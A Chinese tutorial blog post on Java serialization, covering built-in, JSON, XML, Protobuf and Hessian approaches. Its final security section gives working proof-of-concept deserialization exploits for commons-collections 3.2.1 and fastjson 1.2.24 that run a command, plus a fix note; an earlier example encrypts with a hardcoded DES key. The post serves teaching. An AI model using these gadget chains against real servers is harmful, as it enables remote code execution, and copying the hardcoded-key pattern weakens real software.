---
title: Java基础-序列化
date: 2018-03-23 15:33:00
categories: ['Java基础']
tags: ['基础', '序列化']
---

在一般应用创建对象，一般创建的对象存在JVM内存中，在JVM停止后该对象也会随之消失，如果需要对对象进行保存就需要对该对象进行序列化后进行保存。
在不同进程中通信，为了传输对象需要对对象进行序列后在不同进程中进行传输。

所以序列化的目的就是为了`对象`的持久化以及传输。
<!-- more -->

### Serializable序列化
序列化举例：
```java
class Person implements Serializable {
    private static final long serialVersionUID = 4079296645005815685L;

    private String name;
    private Integer age;

    public Person(String name, Integer age) {
        this.name = name;
        this.age = age;
    }

    @Override
    public String toString() {
        return "Person{" +
                "name='" + name + '\'' +
                ", age=" + age +
                '}';
    }
}

public class Main {
    public static void main(String[] args) throws Exception {
        Person whh = new Person("whh", 1);
        System.out.printf("序列化对象：%s \n", whh);
        save(whh, "whh.out");
        Person load = load("whh.out");
        System.out.printf("序列化对象 反序列化对象比较： %s \n", whh == load);
        System.out.printf("反序列化对象：%s \n", load);

        //输出
        /*
        序列化对象：Person{name='whh', age=1}
        序列化对象 反序列化对象比较： false
        反序列化对象：Person{name='whh', age=1}
        */
    }

    //序列化
    public static void save(Person person, String filePath) throws Exception {
        try (
                ObjectOutputStream objectOutputStream = new ObjectOutputStream(new FileOutputStream(filePath));
        ) {
            objectOutputStream.writeObject(person);
        }
    }

    //反序列化
    public static Person load(String filePath) throws Exception {
        try (
                ObjectInputStream objectInputStream = new ObjectInputStream(new FileInputStream(filePath));
        ) {
            return (Person) objectInputStream.readObject();
        }
    }
}
```
在代码中Person是定义的测试类，实现Serializable标识可以进行序列化（如果没Serializable在使用jdk自带序列化时会出错）。从输出可以看出，序列化反序列化都成功了，反序列化后的对象和原有对象不是一个对象（枚举是同一个）。
可以通过ObjectOutputStream.writeObject0中可以看到在序列化的时候，判断顺序是String、Array、Enum、Serializable，如果4者都不是就会抛出序列化异常。

#### 使用自带序列化时需要注意事项：
1、如果父类没有进行序列化，那么只有子类进行序列化，其父类不会序列化，而且父类必须存在一个无参构造方法，不然在反序列化的时候会出错`InvalidClassException:no valid constructor`
2、如果序列化对象依赖属性未实现Serializable接口，那么在进行序列化时会出错。
3、`transient`修饰的属性不会进行序列化
4、静态属性不会进行序列化（静态属性属于类，不属于对象）
5、如果序列化和反序列化时类的ID不一致会导致反序列化失败(`local class incompatible: stream classdesc serialVersionUID = 1, local class serialVersionUID = 2`)，可以用于强制更新，如序列化在服务端，如果服务端修改了序列化后，需要客户端在获取服务端对象时无法反序列化对象，强制客户端从服务端更新类。

第一条举例：
```java
class Parent{
    private String work;

    public Parent(String work) {
        this.work = work;
    }

    public String getWork() {
        return work;
    }
}

class Person extends Parent implements Serializable {
    private static final long serialVersionUID = 4079296645005815685L;

    private String name;
    private Integer age;

    public Person(String name, Integer age) {
        super("work");
        this.name = name;
        this.age = age;
    }

    @Override
    public String toString() {
        return "Person{" +
                "name='" + name + '\'' +
                ", age=" + age +
                '}';
    }
}

public class Main {
    public static void main(String[] args) throws Exception {
        Person whh = new Person("whh", 1);
        System.out.printf(whh.getWork());
        save(whh, "whh.out");
        System.out.println("~~~~");
        Person load = load("whh.out");
        System.out.println(load.getWork());
    }

    //序列化
    public static void save(Person person, String filePath) throws Exception {
        try (
                ObjectOutputStream objectOutputStream = new ObjectOutputStream(new FileOutputStream(filePath));
        ) {
            objectOutputStream.writeObject(person);
        }
    }

    //反序列化
    public static Person load(String filePath) throws Exception {
        try (
                ObjectInputStream objectInputStream = new ObjectInputStream(new FileInputStream(filePath));
        ) {
            return (Person) objectInputStream.readObject();
        }
    }
}
```
在运行时会报错，如果添加构造方法后，获取父类属性为null。

#### 序列化加密
在序列化时，通过读取字节码是可以看到某些序列化后的值，如果对象中存有敏感信息，那么需要通过对序列化字段进行加密。
在序列化过程中，虚拟机会尝试调用对象的`writeObject`、`readObject`方法进行序列化和反序列化，如果未定义该方法，那么默认就是调用`ObjectOutputStream.efaultWriteObject`以及`ObjectInputStream.defaultReadObject`。通过自定义`writeObject`、`readObject`方法达到对数据进行加密的效果。
```java
/**
 * 参考：http://hello-nick-xu.iteye.com/blog/2103775
 */
class DESUtils {
    private static String key = "ABCDEFGHIJK";

    public static String encode(String val) throws Exception {
        //生成密钥
        DESKeySpec keySpec = new DESKeySpec(key.getBytes());
        SecretKeyFactory keyFactory = SecretKeyFactory.getInstance("des");
        SecretKey secretKey = keyFactory.generateSecret(keySpec);
        //加密
        Cipher cipher = Cipher.getInstance("des");
        cipher.init(Cipher.ENCRYPT_MODE, secretKey, new SecureRandom());
        byte[] cipherData = cipher.doFinal(val.getBytes());
        //base
        return new BASE64Encoder().encode(cipherData);
    }

    public static String decode(String val) throws Exception {
        if (val == null) throw new NullPointerException("参数为空");
        //生成密钥
        DESKeySpec keySpec = new DESKeySpec(key.getBytes());
        SecretKeyFactory keyFactory = SecretKeyFactory.getInstance("des");
        SecretKey secretKey = keyFactory.generateSecret(keySpec);
        //解密
        Cipher cipher = Cipher.getInstance("des");
        cipher.init(Cipher.DECRYPT_MODE, secretKey, new SecureRandom());
        byte[] plainData = cipher.doFinal(val.getBytes());
        return new String(plainData);
    }
}

class Person implements Serializable {
    private static final long serialVersionUID = 1;

    private String name;
    private Integer age;

    private String password;

    public Person(String name, String password, Integer age) {
        this.name = name;
        this.age = age;
        this.password = password;
    }

    private void writeObject(ObjectOutputStream out) throws Exception {
        //加密
        String encode = DESUtils.encode(this.password);
        ObjectOutputStream.PutField putField = out.putFields();
        putField.put("name", this.name);
        putField.put("age", this.age);
        putField.put("password", encode);
        out.writeFields();
    }

    private void readObject(ObjectInputStream in) throws Exception {
        ObjectInputStream.GetField getField = in.readFields();
        this.name = (String) getField.get("name", null);
        this.age = (Integer) getField.get("age", null);
        //反序列化
        this.password = DESUtils.decode((String) getField.get("password", null));
    }

    @Override
    public String toString() {
        return "Person{" +
                "name='" + name + '\'' +
                ", age=" + age +
                ", password='" + password + '\'' +
                '}';
    }
}

public class Main {
    public static void main(String[] args) throws Exception {
        Person whh = new Person("whh", "password", 1);
        save(whh, "whh.out");
        Person load = load("whh.out");
        System.out.println("原数据：" + whh);
        //Person{name='whh', age=1, password='uEWfz8iXsxIFXzvIO5347g=='}
        System.out.println("反序列化：" + load);

    }

    //序列化
    public static void save(Person person, String filePath) throws Exception {
        try (
                ObjectOutputStream objectOutputStream = new ObjectOutputStream(new FileOutputStream(filePath));
        ) {
            objectOutputStream.writeObject(person);
        }
    }

    //反序列化
    public static Person load(String filePath) throws Exception {
        try (
                ObjectInputStream objectInputStream = new ObjectInputStream(new FileInputStream(filePath));
        ) {
            return (Person) objectInputStream.readObject();
        }
    }
}
```
上述代码中writeObject中对password进行加密，之后在readObject中对其进行解密。
调用代码内的序列化和反序列化`ObjectOutputStream.writeSerialData`和`ObjectInputStream.readSerialData`。

#### 多次序列化
在进行序列化的时候，可以多次写入对象。
```java
class Person implements Serializable {
    private static final long serialVersionUID = 1;

    private String name;
    private Integer age;

    private String password;

    public Person(String name, String password, Integer age) {
        this.name = name;
        this.age = age;
        this.password = password;
    }

    public void setName(String name) {
        this.name = name;
    }

    @Override
    public String toString() {
        return "Person{" +
                "name='" + name + '\'' +
                ", age=" + age +
                ", password='" + password + '\'' +
                '}';
    }
}

public class Main {
    public static void main(String[] args) throws Exception {
        Person whh = new Person("whh", "password", 1);
        save(whh, "whh.out");
        Person load = load("whh.out");
    }

    //序列化
    public static void save(Person person, String filePath) throws Exception {

        try (
                ObjectOutputStream objectOutputStream = new ObjectOutputStream(new FileOutputStream(filePath));
        ) {
            objectOutputStream.writeObject(person);
            System.out.println("第一次序列化后文件大小：" + new File(filePath).length());//第一次序列化后文件大小：207
            objectOutputStream.flush();
            person.setName("whhxz");
            objectOutputStream.writeObject(person);
            System.out.println("第二次次序列化后文件大小：" + new File(filePath).length());//第二次次序列化后文件大小：212
        }
    }

    //反序列化
    public static Person load(String filePath) throws Exception {
        try (
                ObjectInputStream objectInputStream = new ObjectInputStream(new FileInputStream(filePath));
        ) {
            Person person = (Person) objectInputStream.readObject();
            System.out.println("第一次序列化：" + person);//第一次序列化：Person{name='whh', age=1, password='password'}
            Person person2 = (Person)objectInputStream.readObject();
            System.out.println("第二次序列化：" + person);
            System.out.println(person == person2);//true
        }
    }
}
```
如上，第一次序列化后和第二次序列化后文件大小相差不大，而且两次反序列化后生成的对象是同一个。因为在序列化存储的时候，当写入文件的为同一个对象时，并不会再次将对象内容进行存储，只是再次存储一次引用（5字节），反序列化的时候恢复引用关系，所以第二次反序列化的时候和第一次的值为同一个。

* 注：需要注意的是，在第一次序列化后修改了对象的值，重新序列化，但是在第二次反序列化的时候，该值并没有修改，也是因为第二次序列化的是第一次的引用，所有导致修改值后，反序列化后还是指向第一次的引用。
* 注：在进行反序列化的时候，顺序应该和序列化时的顺序保持一致。

### Externalizable序列化
在对象序列化的时候，除了使用`Serializable`还有一个接口也可以用来标示序列化`Externalizable`。`Externalizable`继承`Serializable`，使用`Externalizable`后`Serializable`会失效。
```java
class Person implements Externalizable {
    private static final long serialVersionUID = 1;

    private String name;
    private Integer age;

    private String password;

    public Person() {
    }

    public Person(String name, String password, Integer age) {
        this.name = name;
        this.age = age;
        this.password = password;
    }

    public void setName(String name) {
        this.name = name;
    }

    @Override
    public String toString() {
        return "Person{" +
                "name='" + name + '\'' +
                ", age=" + age +
                ", password='" + password + '\'' +
                '}';
    }

    @Override
    public void writeExternal(ObjectOutput out) throws IOException {
        out.writeObject(this.name);
        out.writeInt(this.age);
        out.writeObject(this.password);
    }

    @Override
    public void readExternal(ObjectInput in) throws IOException, ClassNotFoundException {
        this.name = (String) in.readObject();
        this.age = in.readInt();
        this.password = (String) in.readObject();
    }
}

public class Main {
    public static void main(String[] args) throws Exception {
        Person whh = new Person("whh", "password", 1);
        save(whh, "whh.out");
        Person load = load("whh.out");
        System.out.println("序列化前对象" + whh);
        System.out.println("序列化后对象" + load);

    }

    //序列化
    public static void save(Person person, String filePath) throws Exception {

        try (
                ObjectOutputStream objectOutputStream = new ObjectOutputStream(new FileOutputStream(filePath));
        ) {
            objectOutputStream.writeObject(person);
        }
    }

    //反序列化
    public static Person load(String filePath) throws Exception {
        try (
                ObjectInputStream objectInputStream = new ObjectInputStream(new FileInputStream(filePath));
        ) {
             return (Person) objectInputStream.readObject();
        }
    }
}
```
上述代码通过实现`Externalizable`接口，在序列化和反序列化时会调用实现的方法用于对象的序列化。同理在序列化和反序列化中，可以修改序列化时对象的值来做定制化处理。

注：在使用`Externalizable`时，必须有个无参的构造方法，不然在反序列化的时候会出错。

#### 源码分析
流程如下：
ObjectOutputStream.writeObject -> writeObject0(判断类型做不同的序列化)->writeOrdinaryObject
在writeOrdinaryObject的时候，会先判断是否`Externalizable`且不是代理类，是走writeExternalData、否走writeSerialData。
writeExternalData为调用实现的接口中方法进行序列化。

writeSerialData为先判断是否有writeObject方法，如果有调用反射调用该方法进行序列化，如果没有获取对象内字段进行序列化。
注意：`static`和`transient`标示的字段不会被获取，可参考`ObjectStreamClass.getDefaultSerialFields`其中就对字段进行了过滤。

所以序列化优先级：
Externalizable > writeObject / readObject > Serializable(默认)

在使用前两个个进行序列化时，可以对`static`和`transient`进行定制的序列化。

### 第三方序列化框架
在对对象进行序列化时，除了自带的序列化，还可以序列化为JSON、XML或者第三方格式。

#### JSON序列化
在web端，js和后台服务交互时，通常会使用json序列化。常用的json序列化框架有：Gson、fastjson、Jackson等。通过Gson举例
maven依赖
```xml
<dependency>
  <groupId>com.google.code.gson</groupId>
  <artifactId>gson</artifactId>
  <version>2.8.2</version>
</dependency>
```
```java
class Person {
    private static final long serialVersionUID = 1;

    private transient String name;
    private Integer age;

    private String password;

    public Person() {
    }

    public Person(String name, String password, Integer age) {
        this.name = name;
        this.age = age;
        this.password = password;
    }

    public void setName(String name) {
        this.name = name;
    }

    @Override
    public String toString() {
        return "Person{" +
                "name='" + name + '\'' +
                ", age=" + age +
                ", password='" + password + '\'' +
                '}';
    }
}

public class Main {
    static Gson gson = new GsonBuilder().create();

    public static void main(String[] args) throws Exception {
        Person whh = new Person("whh", "password", 1);
        String json = save(whh);
        System.out.println(json);//{"age":1,"password":"password"}
        System.out.println(load(json));//Person{name='null', age=1, password='password'}
    }

    //序列化
    public static String save(Person person) throws Exception {
        return gson.toJson(person);
    }

    //反序列化
    public static Person load(String json) throws Exception {
        return gson.fromJson(json, Person.class);
    }
}
```
Gson简单使用如上。Gson还可以做到其他的定制化。详情查看(Gson教程)[https://github.com/google/gson/blob/master/UserGuide.md]

#### XML序列化
采用Simple2.0进行XML序列化。
maven依赖
```xml
<dependency>
  <groupId>org.simpleframework</groupId>
  <artifactId>simple-xml</artifactId>
  <version>2.7.1</version>
</dependency>
```
```java
@Root
class Person {
    private static final long serialVersionUID = 1;

    private transient String name;
    @Element
    private Integer age;

    @Element
    private String password;

    public Person() {
    }

    public Person(String name, String password, Integer age) {
        this.name = name;
        this.age = age;
        this.password = password;
    }

    public void setName(String name) {
        this.name = name;
    }

    @Override
    public String toString() {
        return "Person{" +
                "name='" + name + '\'' +
                ", age=" + age +
                ", password='" + password + '\'' +
                '}';
    }
}

public class Main {
    static Gson gson = new GsonBuilder().create();

    public static void main(String[] args) throws Exception {
        Person whh = new Person("whh", "password", 1);
        save(whh, "person.xml");
        System.out.println(load("person.xml"));//Person{name='null', age=1, password='password'}
    }

    //序列化
    public static void save(Person person, String filePath) throws Exception {
        Persister persister = new Persister();
        persister.write(person, new File(filePath));
    }

    //反序列化
    public static Person load(String filePath) throws Exception {
        return new Persister().read(Person.class, new File(filePath));
    }
}
```
序列化后的xml如下：
```xml
<person>
   <age>1</age>
   <password>password</password>
</person>
```
当然在使用xml序列化的时候也可以对输出的数据进行序列化。

#### 其他序列化框架
第三方格式的序列化框架还有Protobuf、Thrift、Marshalling、Hessian，这些框架在序列化速度和序列化后文件大小通常比较出众。
Protobuf使用比较麻烦：
1、下载 [protoc](https://github.com/google/protobuf/releases/)
2、先用通过proto文件定义模板
3、通过定义的proto模板生成java文件
4、序列化反序列化

proto文件
```proto
//proto版本
syntax = "proto3";
package com.whh.netty;
//输出后所在包
option java_package = "com.whh.netty";
//输出后文件名
option java_outer_classname = "PersonVo";
//消息名，不能和文件名相同
message Person{
    string name = 1;
    int32 age = 2;
    string password = 3;
}
```
通过命令`./protoc -I=/Users/xxxx/src/main/java --java_out=/Users/xxxx/src/main/java /xxxx/src/main/java/com/whh/netty/person.proto`生成PersonVo类，在写java_out时需要注意的是如果有输出包，不需要写包名，会自动生成包路径。
详情查看：[Protocol Buffer Basics: Java](https://developers.google.com/protocol-buffers/docs/javatutorial)
maven依赖
```xml
<dependency>
  <groupId>com.google.protobuf</groupId>
  <artifactId>protobuf-java</artifactId>
  <version>3.5.1</version>
</dependency>
```
```java
public class Main {
    public static void main(String[] args) throws Exception {
        PersonVo.Person person = PersonVo.Person.newBuilder()
                .setName("whh")
                .setAge(1)
                .setPassword("psw").build();
        save(person, "person.out");
        PersonVo.Person load = load("person.out");
        System.out.println("反序列化前：" + person);
        System.out.println("反序列化后：" + load);
    }

    //序列化
    public static void save(PersonVo.Person person, String filePath) throws Exception {
        try (
                FileOutputStream outputStream = new FileOutputStream(filePath);
        ) {
            person.writeTo(outputStream);
        }
    }

    //反序列化
    public static PersonVo.Person load(String filePath) throws Exception {
        try (
                FileInputStream inputStream = new FileInputStream(filePath);
        ) {
            return PersonVo.Person.parseFrom(inputStream);
        }
    }
}
```
代码中对生成的对象进行序列化以及反序列化，生成的对象文件比较大，不进行展示。生成的person.out文件12kb相对java默认序列化生成的文件很小。
* 在使用maven依赖jar时，需要使用的版本和之前下载的`protoc`版本保持一致，避免出错。

thrift参考[Java Tutorial](https://thrift.apache.org/tutorial/java)

Marshalling一般用在JBoss里面，外面用的相对较少

Hessian使用：
maven依赖
```xml
<dependency>
  <groupId>com.caucho</groupId>
  <artifactId>hessian</artifactId>
  <version>4.0.38</version>
</dependency>
```
```java
class Person implements Serializable{
    private String name;
    private Integer age;
    private String password;

    public Person(String name, Integer age, String password) {
        this.name = name;
        this.age = age;
        this.password = password;
    }

    @Override
    public String toString() {
        return "Person{" +
                "name='" + name + '\'' +
                ", age=" + age +
                ", password='" + password + '\'' +
                '}';
    }
}

public class Main {
    public static void main(String[] args) throws Exception {
        Person person = new Person("whh", 1, "pwd");
        save(person, "person.out");
        Person load = load("person.out");
        System.out.println("反序列化前：" + person);
        System.out.println("反序列化后：" + load);
    }

    //序列化
    public static void save(Person person, String filePath) throws Exception {
        try (
                FileOutputStream outputStream = new FileOutputStream(filePath);

        ) {
            Hessian2Output output = new Hessian2Output(outputStream);
            output.writeObject(person);
            output.close();
        }
    }

    //反序列化
    public static Person load(String filePath) throws Exception {
        try (
                FileInputStream inputStream = new FileInputStream(filePath);
        ) {
            Hessian2Input input = new Hessian2Input(inputStream);
            Person person = (Person) input.readObject(Person.class);
            input.close();
            return person;
        }
    }
}
```
使用Hessian时也需要实现接口Serializable。
Hessian在序列化结构简单的类时速度非常快，但是在序列化结构特别复杂类时效率下降比较明显。

上述几种序列化框架各有优缺点，Protobuf、Thrift、Hessian与语言无关，当如果修改文件结构后需要重新生成新文件，序列化速度非常快，非常适合异构系统。java自带序列化只能使用java语言，序列化较慢，生成序列化文件较大。Json、xml序列化后文本易读，但是速度相对前面两种较慢。

此处各种序列化只是简单写的例子，各自还有很多功能未展示。

#### 序列化速度比较

```java
class Person implements Serializable {
    private String name;
    private Integer age;
    private String password;
    private Date birthday;
    private Integer gender;
    private String addr;

    public Person(String name, Integer age, String password, Date birthday, Integer gender, String addr) {
        this.name = name;
        this.age = age;
        this.password = password;
        this.birthday = birthday;
        this.gender = gender;
        this.addr = addr;
    }
}

public class Main {
    public static void main(String[] args) throws Exception {
        Person person = new Person("whh", 1, "pwd", new Date(), 1, "湖北");
        Instant time = Instant.now();
        Timestamp timestamp = Timestamp.newBuilder().setSeconds(time.getEpochSecond())
                .setNanos(time.getNano()).build();
        PersonVo.Person person1 = PersonVo.Person.newBuilder()
                .setName("whh")
                .setAge(1)
                .setPassword("pwd")
                .setBirthday(timestamp)
                .setGender(1)
                .setAddr("湖北").build();

        byte[] bytes = hessianSave(person, 1);
        long start = System.currentTimeMillis();
        Person personLoad = hessianLoad(1000000, bytes);
        System.out.println("耗时：" + (System.currentTimeMillis() - start));
        System.out.println("大小：" + (bytes.length));
        System.out.println(personLoad);

    }

    public static byte[] javaSave(Person person, int num) throws Exception {
        byte[] bytes = null;
        for (int i = 0; i < num; i++) {
            try (
                    ByteArrayOutputStream outputStream = new ByteArrayOutputStream(1024);
                    ObjectOutputStream objectOutputStream = new ObjectOutputStream(outputStream);
            ) {
                objectOutputStream.writeObject(person);
                bytes = outputStream.toByteArray();
            }
        }
        return bytes;
    }

    public static Person javaLoad(int num, byte[] bytes) throws Exception {
        Person person = null;
        for (int i = 0; i < num; i++) {

            try (ByteArrayInputStream inputStream = new ByteArrayInputStream(bytes);) {
                person = (Person) new ObjectInputStream(inputStream).readObject();
            }
        }
        return person;
    }

    public static byte[] gsonSave(Person person, int num) throws Exception {
        Gson gson = new GsonBuilder().create();
        byte[] bytes = null;
        for (int i = 0; i < num; i++) {
            String str = gson.toJson(person);
            bytes = str.getBytes();
        }
        return bytes;
    }

    public static Person gsonLoad(int num, byte[] bytes) throws Exception {
        Person person = null;
        Gson gson = new GsonBuilder().create();
        for (int i = 0; i < num; i++) {

            person = gson.fromJson(new String(bytes), Person.class);
        }
        return person;
    }

    public static byte[] protoSave(PersonVo.Person person, int num) throws Exception {
        byte[] bytes = null;
        for (int i = 0; i < num; i++) {
            try (
                    ByteArrayOutputStream outputStream = new ByteArrayOutputStream(1024);
            ) {
                person.writeTo(outputStream);
                bytes = outputStream.toByteArray();
            }
        }
        return bytes;
    }
    public static PersonVo.Person protoLoad(int num, byte[] bytes) throws Exception{
        PersonVo.Person person = null;
        for (int i = 0; i < num; i++) {
            person = PersonVo.Person.parseFrom(bytes);
        }
        return person;
    }

    public static byte[] hessianSave(Person person, int num) throws Exception {
        byte[] bytes = null;
        for (int i = 0; i < num; i++) {
            try (
                    ByteArrayOutputStream outputStream = new ByteArrayOutputStream(1024);
            ) {
                Hessian2Output output = new Hessian2Output(outputStream);
                output.writeObject(person);
                output.close();
                bytes = outputStream.toByteArray();
            }
        }
        return bytes;
    }
    public static Person hessianLoad(int num, byte[]bytes) throws Exception{
        Person person = null;
        for (int i = 0; i < num; i++) {
            person = (Person) new Hessian2Input(new ByteArrayInputStream(bytes)).readObject(Person.class);
        }
        return person;
    }
}
```
```proto
syntax = "proto3";
import public "google/protobuf/timestamp.proto";
package com.whh.netty;

option java_package = "com.whh.netty";
option java_outer_classname = "PersonVo";
message Person{
    string name = 1;
    int32 age = 2;
    string password = 3;
    google.protobuf.Timestamp birthday = 4;
    int32 gender = 5;
    string addr = 6;
}
```
使用的对象比较简单，暂时未测试复杂对象的序列化。对比图如下：
![](/images/old/20180325屏幕快照2018-03-25下午5.09.54.png)
![](/images/old/20180325屏幕快照2018-03-25下午5.09.37.png)

Thrift未加入进行比较，和protobuf同样是先定义好文件，所以速度应该也会很快。

### 序列化安全
在对对象进行反序列化的时候，用户自定义了readObject，那么就会执行readObject中的方法进行调用，反序列化对象。存在恶意代码，如通过Runtime.getRuntime().exec执行危险命令，那么程序就会变得非常危险。

正常情况下，开发人员不会直接在readObject中执行相关命令，但是如果引用第三方包，第三方包可能存在反序列化漏洞。

#### commons-collections漏洞（低于3.2.1）
在commons-collections中有个类`TransformedMap`是对Java标准数据结构Map接口的一个扩展。该类可以在一个元素加入集合时，自动对该类进行特定的修饰转换。
添加maven依赖
```XML
<dependency>
  <groupId>commons-collections</groupId>
  <artifactId>commons-collections</artifactId>
  <version>3.2.1</version>
</dependency>
```
TransformedMap使用如下：
```java
Map decorate = TransformedMap.decorate(new HashMap<String, String>(), null, new Transformer() {
    @Override
    public Object transform(Object input) {
        return ((String) input) + "~~~";
    }
});
decorate.put("test", "test");
System.out.println(decorate);//{test=test~~~}
```
对传入的值进行处理。
TransformedMap传入的是Transformer，该接口有很多实现类，其中`InvokerTransformer`是里面的一个关键实现类。通过`ChainedTransformer`构造多个`InvokerTransformer`。
```java
public ChainedTransformer(Transformer[] transformers) {
    super();
    iTransformers = transformers;
}
public Object transform(Object object) {
    for (int i = 0; i < iTransformers.length; i++) {
        object = iTransformers[i].transform(object);
    }
    return object;
}
```
ChainedTransformer关键方法如上，通过构造函数构造多个Transformer传入，transform实现为依次调用传入的`transformers`，同时把返回值传入下一个
`Transformer.transform`。这样就可以形成方法调用链。

```java
public InvokerTransformer(String methodName, Class[] paramTypes, Object[] args) {
    super();
    iMethodName = methodName;
    iParamTypes = paramTypes;
    iArgs = args;
}

public Object transform(Object input) {
    if (input == null) {
        return null;
    }
    try {
        Class cls = input.getClass();
        Method method = cls.getMethod(iMethodName, iParamTypes);
        return method.invoke(input, iArgs);

    } catch (NoSuchMethodException ex) {
        throw new FunctorException("InvokerTransformer: The method '" + iMethodName + "' on '" + input.getClass() + "' does not exist");
    } catch (IllegalAccessException ex) {
        throw new FunctorException("InvokerTransformer: The method '" + iMethodName + "' on '" + input.getClass() + "' cannot be accessed");
    } catch (InvocationTargetException ex) {
        throw new FunctorException("InvokerTransformer: The method '" + iMethodName + "' on '" + input.getClass() + "' threw an exception", ex);
    }
}
```
InvokerTransformer核心方法如上，通过构造传入的值，通过反射调用方法，返回反射调用的值。实例如下：
```java
Transformer[] transformers = {
        new ConstantTransformer(Runtime.class),
        new InvokerTransformer("getMethod",
                new Class[]{String.class, Class[].class},
                new Object[]{
                        "getRuntime", null
                }),
        new InvokerTransformer("invoke",
                new Class[]{Object.class, Object[].class},
                new Object[]{
                        null,
                        new Object[0]
                }),
        new InvokerTransformer("exec",
                new Class[]{
                        String.class},
                new Object[]{"atom"})
};
Transformer chainedTransformer = new ChainedTransformer(transformers);
Map<String, String> map = new HashMap<>();
map.put("key", "value");

Map outMap = TransformedMap.decorate(map, null, chainedTransformer);
outMap.put("key", "val");
```
通过精心构造调用链，当TransformedMap传入值是，回调Transformer，最终调用的是`transformers`数组调用链。
最终执行类似于如下：
```java
Class<Runtime> runtimeClass = Runtime.class;
Method method = runtimeClass.getMethod("getRuntime", null);
//static 方法
Runtime runtime = (Runtime)method.invoke(null, new Object[0]);
runtime.exec("atom");
```

如何利用该漏洞呢，需要找到一个可以利用该漏洞的类：
1、自定义了反序列化方法。
2、类存在属性Map
3、有对Map对象赋值操作。

刚刚好`sun.reflect.annotation.AnnotationInvocationHandler`满足该类。该类有个Map属性，同时实现了反序列化方法，同时在反序列化的时候对Map进行了赋值。
```java
public class Main {
    public static void main(String[] args) throws Exception {

        save("obj.out");
        load("obj.out");
    }

    public static Map save(String filePath) throws Exception {
        //构造需要的Map
        Transformer[] transformers = {
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer("getMethod",
                        new Class[]{String.class, Class[].class},
                        new Object[]{
                                "getRuntime", null
                        }),
                new InvokerTransformer("invoke",
                        new Class[]{Object.class, Object[].class},
                        new Object[]{
                                null,
                                new Object[0]
                        }),
                new InvokerTransformer("exec",
                        new Class[]{
                                String.class},
                        new Object[]{"atom"})
        };
        Transformer chainedTransformer = new ChainedTransformer(transformers);
        Map<String, String> map = new HashMap<>();
        //重点：key的值必须为value
        map.put("value", "value");
        Map outMap = TransformedMap.decorate(map, null, chainedTransformer);
        //反射构造对象
        Class<?> clazz = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
        Constructor<?> constructor = clazz.getDeclaredConstructor(Class.class, Map.class);
        constructor.setAccessible(true);
        Object obj = constructor.newInstance(Target.class, outMap);
        //序列化对象
        ObjectOutputStream outputStream = new ObjectOutputStream(new FileOutputStream(filePath));
        outputStream.writeObject(obj);
        outputStream.close();
        return outMap;

    }

    /**
     * 反序列化
     * @param filePath
     * @return
     * @throws Exception
     */
    public static Object load(String filePath) throws Exception {
        ObjectInputStream inputStream = new ObjectInputStream(new FileInputStream(filePath));
        Object obj = inputStream.readObject();
        inputStream.close();
        return obj;
    }
}
```
先构造需要的Map对象，之后通过反射构造AnnotationInvocationHandler对象，对该对象进行序列化。之后反序列化的时候，就会执行之前构造的命令。
很多服务之间数据传输就是使用的序列化对象，如果对传输的序列化对象进行拦截抓包，伪造自定义的序列化对象，接收端在反序列化的时候就会执行代码中构造的命令。
出现该漏洞的有：WebLogic、WebSphere、JBoss、Jenkins等。
反序列化漏洞利用工具参考 https://github.com/frohoff/ysoserial 还有利用反序列化切入点。

##### commons-collections漏洞解决办法
更新版本超过3.2.1版本。
commons-collections新版本如何修复的呢，在`InvokerTransformer`的`writeObject、readObject`加入了检查不安全的序列化`FunctorUtils.checkUnsafeSerialization`，其实就是从System中读取`org.apache.commons.collections.enableUnsafeSerialization`判断是否为true，如果不是就报错，那么`InvokerTransformer`就无法进行序列化以及反序列化。

#### fastjson漏洞
在对对象进行json序列化时，除了使用Gson还有fastjson，不过fastjson爆出过序列化漏洞
添加Maven依赖
```XML
<dependency>
  <groupId>com.alibaba</groupId>
  <artifactId>fastjson</artifactId>
  <!--1.2.22-1.2.24-->
  <version>1.2.24</version>
</dependency>
```
先构造一个用于执行的类
```java
public class ExecRun extends AbstractTranslet {
    public ExecRun() {
        StackTraceElement[] stackTrace = Thread.currentThread().getStackTrace();
        System.out.println("调用栈~~~~~~");
        for (StackTraceElement stackTraceElement : stackTrace) {
            System.out.println(stackTraceElement);
        }
        System.out.println("调用栈~~~~~~");
        try {
            Runtime.getRuntime().exec("atom");
        } catch (IOException e) {
            e.printStackTrace();
        }
    }

    @Override
    public void transform(DOM document, SerializationHandler[] handlers) throws TransletException {

    }

    @Override
    public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException {

    }
}
```
编译该类得到class。
```java
public class Main {
    public static void main(String[] args) throws Exception{
        //编译后文件路径
        String execRunPath = "./target/classes/com/whh/netty/ExecRun.class";
        //读取文件字节码
        FileInputStream inputStream = new FileInputStream(execRunPath);
        ByteArrayOutputStream outputStream = new ByteArrayOutputStream(1024);
        byte[]bytes = new byte[1024];
        int len = 0;
        while ((len = inputStream.read(bytes)) != -1){
            outputStream.write(bytes, 0, len);
        }
        //编译字节码为base64
        BASE64Encoder encoder = new BASE64Encoder();
        String base64Str = encoder.encode(outputStream.toByteArray()).replace("\n", "");
        //构造json
        String templatesImpl = "com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl";
        String sb = "{\"@type\":\"" +
                templatesImpl +
                "\",\"_bytecodes\":[\"" +
                base64Str +
                "\"], \"_name\":\"a.b\", \"_tfactory\":{},\"_outputProperties\":{ }}";
        //序列化对象
        Object o = JSON.parseObject(sb, Object.class, Feature.SupportNonPublicField);
        System.out.println(o instanceof TemplatesImpl);
    }
}
```
执行该Main方法后就会执行ExecRun的构造函数。
可以通过上述构造的json提交远程服务器，如果服务器存在该反序列化漏洞，那么就会执行之前ExecRun中的方法。

执行的调用栈：
```log
java.lang.Thread.getStackTrace(Thread.java:1552)
com.whh.netty.ExecRun.<init>(ExecRun.java:18)
sun.reflect.NativeConstructorAccessorImpl.newInstance0(Native Method)
sun.reflect.NativeConstructorAccessorImpl.newInstance(NativeConstructorAccessorImpl.java:62)
sun.reflect.DelegatingConstructorAccessorImpl.newInstance(DelegatingConstructorAccessorImpl.java:45)
java.lang.reflect.Constructor.newInstance(Constructor.java:422)
java.lang.Class.newInstance(Class.java:442)
com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl.getTransletInstance(TemplatesImpl.java:408)
com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl.newTransformer(TemplatesImpl.java:439)
